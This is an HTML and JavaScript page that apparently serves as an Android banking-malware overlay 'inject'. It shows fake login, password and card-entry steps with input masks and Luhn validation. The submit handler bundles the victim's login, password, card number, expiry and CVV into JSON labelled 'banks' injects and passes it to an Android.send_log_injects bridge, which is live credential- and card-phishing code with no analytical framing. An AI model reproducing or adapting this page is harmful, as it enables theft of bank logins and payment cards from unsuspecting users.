<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <style>
        body {
            background-color: #fefefe;
        }

        #form1, #form2, #form3 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            padding: 20px;
            flex: 1;
        }

        .cool-input {
            box-sizing: border-box;
            border: 2px solid rgb(228, 228, 228);
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
            background-color: #ffffff;
            border-radius: 6px;
            padding: 5px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left: 15px;
            top: 50%;
            line-height: 0;
            color: #7c8598;
            font-weight: 600;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 1em;
        }

        section {
            padding: 25px;
        }

        .input {
            border: 0;
            padding: 15px;
            padding-left: 10px;
            padding-right: 10px;
            padding-top: 15px;
            padding-bottom: 0px;
            color: #000;
        }

        .input:focus + .cool-input {
            background-color: #454545;
        }

        .borderBlue {
            border: 2px solid #469bf7
        }

        .error {
            border-color: #f00 !important;
        }

        .button {
            width: 60%;
            background-color: #cd3099;
            color: #fff;
            border: 0;
            border-radius: 25px;
            padding: 15px;
            display: block;
            margin: 0 auto;
        }

        .button:disabled {
            opacity: 0.4;
        }

        footer {
            padding: 25px;
        }

        input, button {
            outline: none !important;
             box-shadow: none !important;
        }
    </style>
</head>

    <script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var coolInput = document.getElementById('coolInput'),
            coolInput2 = document.getElementById('coolInput2');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData'),
            sendDataFull = document.getElementById('sendDataFull');

        login.onfocus = () => {
            coolInput.classList.add('borderBlue')
        }

        login.onblur = () => {
            coolInput.classList.remove('borderBlue')
        }

        nextPage.onclick = () => {
            if(login.value.length < 4) {
                coolInput.classList.add('error')
                login.focus()
            } else {
                coolInput.classList.remove('error')

                spinner.style.display = 'block'
                setTimeout(() => {
                    spinner.style.display = 'none'
                    form1.style.display = 'none'
                    form2.style.display = 'flex'
                }, 2000);
            }
        }

        sendData.onclick = () => {
            if(password.value.length < 4) {
                coolInput2.classList.add('error')
                password.focus()
            } else {
                coolInput2.classList.remove('error')

                form2.style.display = 'none';
                form3.style.display = 'block';
            }
        }

        sendDataFull.onclick = () => {
            var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
        

        function check3() {
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);

			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);

            function expCheck() {
                if(month > 12 || month == 0 || month == 00 || someday < today || year > 30 || exp.value.length != 5) {
                    return false
                } else {
                    return true
                }
            }

            if(valid_credit_card(cc.value) && expCheck() == true && cvv.value.length == 3) {
                        sendDataFull.disabled = false
                    } else {
                        sendDataFull.disabled = true
                    }
            }
            
function valid_credit_card(value) {
    if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
    if (/[^0-9-\s]+/.test(value)) return false;
    var nCheck = 0, nDigit = 0, bEven = false;
    value = value.replace(/\D/g, "");
    for (var n = value.length - 1; n >= 0; n--) {
        var cDigit = value.charAt(n),
            nDigit = parseInt(cDigit, 10);
        if (bEven) {
            if ((nDigit *= 2) > 9) nDigit -= 9;
        }
        nCheck += nDigit;
        bEven = !bEven;
    }
    return (nCheck % 10) == 0;
}
    </script>
